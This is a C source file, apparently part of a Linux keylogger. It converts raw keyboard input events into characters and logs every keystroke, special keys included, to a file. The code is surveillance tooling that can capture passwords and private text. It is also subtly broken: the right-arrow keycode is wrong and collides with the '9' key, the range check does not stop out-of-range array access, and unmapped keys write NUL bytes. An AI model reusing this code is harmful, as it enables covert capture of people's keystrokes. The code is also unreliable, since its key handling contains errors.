#include <stdio.h>
#include <linux/input.h>
#include <ctype.h>

#define PRINT_SPECIAL_KEYS 1
#define KEYPRESSED 1
#define KEYRELEASED 0

// Special key mappings
#define ESCAPE 1
#define BACKSPACE 14
#define TAB 15
#define ENTER 28
#define CAPS_LOCK 58
#define LEFT_SHIFT 42
#define RIGHT_SHIFT 54
#define LEFT_CTRL 29
#define RIGHT_CTRL 97
#define LEFT_ALT 56
#define RIGHT_ALT 100
#define LEFT_META 125
#define RIGHT_META 126
#define MENU 127
#define DELETE 111
#define UP_ARROW 103
#define DOWN_ARROW 108
#define LEFT_ARROW 105
#define RIGHT_ARROW 10

/* These keep track of the keyboard's state */
static int shift_pressed = 0;
static int caps_on = 0;

/* Some keymappings when shift is not being pressed */
static const char *keymap[128] = {
    NULL, NULL, "1", "2", "3", "4", "5", "6", "7", "8", 
    "9", "0", "-", "=", NULL, NULL, "q", "w", "e", "r", 
    "t", "y", "u", "i", "o", "p", "[", "]", 
    NULL, NULL,"a", "s", "d", "f", "g", "h", "j", "k", 
    "l", ";", "'", "`", NULL, "\\", "z", "x", "c", "v", 
    "b", "n", "m", ",", ".", "/", NULL, NULL, NULL, " ", 
};

/* The same keymappings, when shift is pressed */
static const char *shift_keymap[128] = {
    NULL, NULL, "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+", NULL,
    NULL, "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "{", "}", NULL,
    NULL, "A", "S", "D", "F", "G", "H", "J", "K", "L", ":", "\"", "~", NULL,
    "|", "Z", "X", "C", "V", "B", "N", "M", "<", ">", "?", NULL, NULL, NULL, " ",
};

/*  Given a keycode, converts it to a character. 
    Takes into account the keyboard state (if shift or capslock is pressed)
*/
static char keycode_to_char(int keycode) {
    char c;

    if (keycode < 0 || keycode >= 128) {
        c = '\0'; // Keycode not yet mapped
    }

    if (shift_pressed) {
        c = shift_keymap[keycode] ? *shift_keymap[keycode] : '\0';
    } else {
        c = keymap[keycode] ? *keymap[keycode] : '\0';
    }

    if (caps_on) {
        c = (shift_pressed) ? tolower(c) : toupper(c);
    }

    return c;
}

/*  
    This will log keystrokes in a relatively raw but somewhat human-readable way 
    into the provided file.

    It handles shift, capslock, enter, and tab the way you might expect, mirroring 
    what the user likely sees. For all other special keys (backspace, ctrl, ...) 
    if print_special_keys is set to 1, it merely prints out <BACKSPACE>, <CTRL>, 
    etc., perhaps to be parsed by some other program.

    Mapped for US standard keyboard layout.
*/
void log_keystroke(FILE * file, struct input_event event)
{
    char keystroke;

    // Handle the most special key events
    switch (event.code) {
		case TAB:
            if (event.value == KEYPRESSED) fprintf(file, "\t");
            break;
		case ENTER:
            if (event.value == KEYPRESSED) fprintf(file, "\n");
            break;
		case CAPS_LOCK:
            if (event.value == KEYPRESSED) caps_on = !caps_on;
            break;
		case LEFT_SHIFT:
		case RIGHT_SHIFT:
            shift_pressed = (event.value == KEYPRESSED);
            break;
    }

    // Handle slightly less special key events
    if (event.value == KEYPRESSED && PRINT_SPECIAL_KEYS) 
        switch(event.code) {
			case ESCAPE:
	            fprintf(file, "<ESC>");
	            break;
			case BACKSPACE:
	            fprintf(file, "<BACKSPACE>");
	            break;
			case LEFT_CTRL:
			case RIGHT_CTRL:
	            fprintf(file, "<CTRL>");
	            break;
			case LEFT_ALT:
			case RIGHT_ALT:
	            fprintf(file, "<ALT>");
	            break;
			case LEFT_META:
			case RIGHT_META:
	            fprintf(file, "<META>");
	            break;
			case MENU:
	            fprintf(file, "<MENU>");
	            break;
			case DELETE:
	            fprintf(file, "<DELETE>");
	            break;
			case UP_ARROW:
	            fprintf(file, "<UPARROW>");
	            break;
			case DOWN_ARROW:
	            fprintf(file, "<DOWNARROW>");
	            break;
			case LEFT_ARROW:
	            fprintf(file, "<LEFTARROW>");
	            break;
			case RIGHT_ARROW:
	            fprintf(file, "<RIGHTARROW>");
	            break;
        }


    // Convert keycode to a character and log it.
    if (event.value == KEYRELEASED) {
        keystroke = keycode_to_char(event.code);
        fprintf(file, "%c", keystroke);
    }
}